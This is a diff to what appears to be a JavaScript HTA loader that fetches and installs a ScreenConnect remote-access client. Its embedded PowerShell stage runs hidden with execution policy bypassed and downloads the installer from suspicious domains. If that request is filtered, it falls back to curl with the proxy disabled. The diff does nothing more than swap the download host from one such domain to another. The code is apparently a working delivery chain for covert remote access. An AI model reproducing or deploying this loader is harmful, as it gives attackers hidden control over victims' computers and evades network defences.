@@ -101,7 +101,7 @@
 // ---------------------------------------------------------------------------
 // Config
 // ---------------------------------------------------------------------------
-var MSI_URL   = "https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+var MSI_URL   = "https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
 
 // Timing budgets
 var DL_MAX_MS      = 480000;   // hard cap for the whole download (8 min)
@@ -154,7 +154,7 @@ var extScanDirs = null, extSinceT = 0, extLastSize = -1, extStableT = 0;
 var powMarker = "", powT0 = 0, powLastSize = 0, powLastGrowT = 0;
 var edgeMaxPartial = 0, edgeLastPartial = 0, edgeLastGrowT = 0, edgeLogT = 0;
 var powPartialMax = 0;
-var POW_PS = "# ScreenConnect client download (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# The WinINET-based client that gets through on boxes where WinHttp/XHR/BITS\n# get their response bodies stripped (empty-206). The HTA watches this file's\n# size for download progress; the elevated msiexec install is done separately\n# by the HTA (single UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"scm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"sc_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"sc_client.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls sc_client.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // ScreenConnect's own download command
+var POW_PS = "# ScreenConnect client download (Invoke-WebRequest), run hidden by the HTA's \"pow\"\n# stage. param(1) = unique per-page marker (process-kill), param(2) = per-page\n# temp dir (so concurrent runs never collide).\n#\n# The WinINET-based client that gets through on boxes where WinHttp/XHR/BITS\n# get their response bodies stripped (empty-206). The HTA watches this file's\n# size for download progress; the elevated msiexec install is done separately\n# by the HTA (single UAC prompt), so it is NOT run here.\nparam([string]$Marker = \"scm1\", [string]$TmpDir = \"\")\n\n$ErrorActionPreference = \"Continue\"\n\nif (-not $TmpDir) { $TmpDir = Join-Path ([System.IO.Path]::GetTempPath()) (\"sc_\" + $Marker) }\ntry { New-Item -ItemType Directory -Path $TmpDir -Force | Out-Null } catch {}\n\n$tempFile = Join-Path $TmpDir \"sc_client.msi\"\ntry { Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue } catch {}\n\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n\ntry {\n  $ProgressPreference = 'SilentlyContinue'\n  Invoke-WebRequest -Uri \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" -OutFile $tempFile -UseBasicParsing\n  $ProgressPreference = 'Continue'\n} catch {\n  # Fallback: built-in curl (a separate HTTP stack) in case iwr is also filtered.\n  $env:NO_PROXY = \"*\"\n  try { curl.exe -L --fail --retry 2 --connect-timeout 20 -o $tempFile \"https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest\" 2>$null } catch {}\n}\n\n# Marker file signals \"iwr ran to completion (whatever the result)\". The HTA\n# polls sc_client.msi's size for progress and this flag to know the attempt is done.\ntry { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") -Value $Marker -NoNewline } catch {}\n";   // ScreenConnect's own download command
 var powDir = "";
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -232,7 +232,7 @@ function cleanStale() {
 //   curl     the built-in curl.exe, separate process.
 //   pow      the hidden-Invoke-WebRequest download stage (the WinINET client
 //            that ships with the OS): powershell.exe -ExecutionPolicy Bypass
-//            "iwr https://opt.smar-to.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
+//            "iwr https://don.lifetime-r.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest
 //            -OutFile %TEMP%\sc_<id>\sc_client.msi" (TLS12). Gets through on
 //            boxes where WinHttp/XHR/BITS have their response bodies
 //            stripped (empty-206). The elevated msiexec install is done
